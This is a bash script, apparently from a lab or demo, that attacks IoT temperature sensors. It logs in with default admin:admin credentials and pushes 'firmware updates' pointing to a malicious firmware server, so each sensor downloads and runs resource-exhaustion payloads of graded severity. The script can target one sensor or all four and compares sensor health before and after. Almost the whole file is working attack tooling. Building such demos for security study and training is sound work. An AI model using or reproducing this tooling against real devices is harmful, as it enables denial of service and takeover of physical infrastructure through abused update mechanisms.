#!/bin/bash
# Attack scripts for demonstrating resource exhaustion via firmware update

# Variables
SERVER_URL="http://malicious-firmware-server:38888"
SENSOR_01_URL="http://temperature-sensor-01:12381"
SENSOR_02_URL="http://localhost:12382"
SENSOR_03_URL="http://temperature-sensor-03:12383"
SENSOR_04_URL="http://temperature-sensor-04:12384"
USERNAME="admin"
PASSWORD="admin"

# Function to check sensor health/resource status
check_sensor_health() {
    local sensor_url=$1
    echo "Checking health of $sensor_url..."
    curl -s "$sensor_url/health" | jq .
    
    # Try to get resource usage if available
    echo "Checking resource usage..."
    curl -s "$sensor_url/health/resources" 2>/dev/null | jq . || echo "Resource endpoint not available"
}

# Function to launch attack against specific sensor
attack_sensor() {
    local sensor_url=$1
    local firmware_name=$2
    local firmware_url="$SERVER_URL/$firmware_name"
    local attack_name=$3
    
    echo "============================================"
    echo "🔥 Launching $attack_name attack against $sensor_url"
    echo "📦 Using firmware: $firmware_url"
    echo "============================================"
    
    # Check sensor health before attack
    echo "Pre-attack sensor status:"
    check_sensor_health "$sensor_url"
    
    # Launch the attack
    echo "Sending malicious firmware update..."
    curl -X POST -u "$USERNAME:$PASSWORD" \
         -H "Content-Type: application/json" \
         -d "{\"firmware_url\": \"$firmware_url\", \"version\": \"1.2.3-EXPLOIT\"}" \
         "$sensor_url/firmware/update"
    
    echo -e "\nAttack launched! Waiting 5 seconds before checking status...\n"
    sleep 5
    
    # Check sensor health after attack
    echo "Post-attack sensor status:"
    check_sensor_health "$sensor_url"
    
    echo -e "\nTo monitor ongoing resource usage, run:"
    echo "watch -n 1 'curl -s $sensor_url/health/resources | jq'"
    echo "============================================"
}

# Help menu
show_help() {
    echo "IoT Sensor Resource Exhaustion Attack Tools"
    echo ""
    echo "Usage: $0 [command] [target]"
    echo ""
    echo "Commands:"
    echo "  mild    - Launch mild resource exhaustion attack (500:1 ratio)"
    echo "  medium  - Launch medium resource exhaustion attack (2000:1 ratio)"
    echo "  severe  - Launch severe resource exhaustion attack (5000:1 ratio)"
    echo "  extreme - Launch extreme resource exhaustion attack (10000:1 ratio)"
    echo "  health  - Check sensor health without attacking"
    echo ""
    echo "Targets:"
    echo "  sensor1 - Attack temperature-sensor-01"
    echo "  sensor2 - Attack temperature-sensor-02"
    echo "  sensor3 - Attack temperature-sensor-03"
    echo "  sensor4 - Attack temperature-sensor-04"
    echo "  all     - Attack all sensors sequentially"
    echo ""
    echo "Example:"
    echo "  $0 medium sensor1    # Launch medium attack against sensor 1"
    echo "  $0 health all        # Check health of all sensors"
    echo ""
}

# Main execution
if [ $# -lt 2 ]; then
    show_help
    exit 1
fi

command=$1
target=$2

case $command in
    mild)
        firmware="mild_firmware.sh"
        attack_name="Mild Resource Exhaustion"
        ;;
    medium)
        firmware="medium_firmware.sh"
        attack_name="Medium Resource Exhaustion"
        ;;
    severe)
        firmware="severe_firmware.sh"
        attack_name="Severe Resource Exhaustion"
        ;;
    extreme)
        firmware="extreme_firmware.sh"
        attack_name="Extreme Resource Exhaustion"
        ;;
    health)
        # Just check health without attacking
        attack_name="Health Check"
        ;;
    *)
        echo "Unknown command: $command"
        show_help
        exit 1
        ;;
esac

case $target in
    sensor1)
        if [ "$command" == "health" ]; then
            check_sensor_health "$SENSOR_01_URL"
        else
            attack_sensor "$SENSOR_01_URL" "$firmware" "$attack_name"
        fi
        ;;
    sensor2)
        if [ "$command" == "health" ]; then
            check_sensor_health "$SENSOR_02_URL"
        else
            attack_sensor "$SENSOR_02_URL" "$firmware" "$attack_name"
        fi
        ;;
    sensor3)
        if [ "$command" == "health" ]; then
            check_sensor_health "$SENSOR_03_URL"
        else
            attack_sensor "$SENSOR_03_URL" "$firmware" "$attack_name"
        fi
        ;;
    sensor4)
        if [ "$command" == "health" ]; then
            check_sensor_health "$SENSOR_04_URL"
        else
            attack_sensor "$SENSOR_04_URL" "$firmware" "$attack_name"
        fi
        ;;
    all)
        if [ "$command" == "health" ]; then
            check_sensor_health "$SENSOR_01_URL"
            check_sensor_health "$SENSOR_02_URL"
            check_sensor_health "$SENSOR_03_URL"
            check_sensor_health "$SENSOR_04_URL"
        else
            echo "⚠️ WARNING: You are about to attack ALL sensors!"
            echo "This could impact your entire IoT network."
            read -p "Continue? (y/n) " -n 1 -r
            echo
            if [[ $REPLY =~ ^[Yy]$ ]]; then
                attack_sensor "$SENSOR_01_URL" "$firmware" "$attack_name"
                attack_sensor "$SENSOR_02_URL" "$firmware" "$attack_name"
                attack_sensor "$SENSOR_03_URL" "$firmware" "$attack_name"
                attack_sensor "$SENSOR_04_URL" "$firmware" "$attack_name"
            fi
        fi
        ;;
    *)
        echo "Unknown target: $target"
        show_help
        exit 1
        ;;
esac